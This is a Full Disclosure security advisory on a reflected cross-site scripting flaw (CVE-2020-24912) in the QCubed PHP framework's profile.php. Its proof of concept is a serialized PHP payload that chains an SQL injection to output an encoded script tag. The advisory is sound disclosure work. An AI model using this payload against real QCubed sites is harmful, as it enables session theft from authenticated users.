Subject: [FD] [AIT-SA-20210215-03] CVE-2020-24912: QCube Cross-Site-Scripting


QCube Cross-Site-Scripting
======================
| Identifier: | AIT-SA-20210215-03 |
| Target: | QCubed Framework |
| Vendor: | QCubed |
| Version: | all versions including 3.1.1 |
| CVE: | CVE-2020-24912 |
| Accessibility: | Remote |
| Severity: | High |
| Author: | Wolfgang Hotwagner (AIT Austrian Institute of Technology) |

SUMMARY
=======
QCubed is a PHP Model-View-Controller Rappid Application Development framework. (https://github.com/qcubed/qcubed)

VULNERABILITY DESCRIPTION
=========================
A reflected cross-site scripting (XSS) vulnerability in qcubed (all versions including 3.1.1) in profile.php via the stQuery-parameter allows unauthenticated attackers to steal sessions of authenticated users.

PROOF OF CONCEPT
=================
The XSS occurs because the SQL-output in profile.php is not sanitized properly. Since we are able to tamper the output using a SQL-injection(CVE-2020-24913), we can easily output a common XSS string.

We use the following payload(unencoded):

```
a:1:{i:0;a:3:{s:12:"objBacktrace";a:1:{s:4:"args";a:1:{i:0;s:3:"PWN";}}s:8:"strQuery";s:112:"select version(); select convert_from(decode($$PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4K$$,$$base64$$),$$utf-8$$)";s:11:"dblTimeInfo";s:1:"1";}}
```

PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4K is unencoded:

```
"<script>alert(‘xss’)</script>"
```

VULNERABLE VERSIONS
===================
All versions including 3.1.1 are affected.


TESTED VERSIONS
===============
QCubed 3.1.1

IMPACT
======
An unauthenticated attacker could  steal sessions of authenticated users.

MITIGATION
==========

A patch was delivered by QCubed that allows to disable the profile-functionality( https://github.com/qcubed/qcubed/pull/1320/files ).
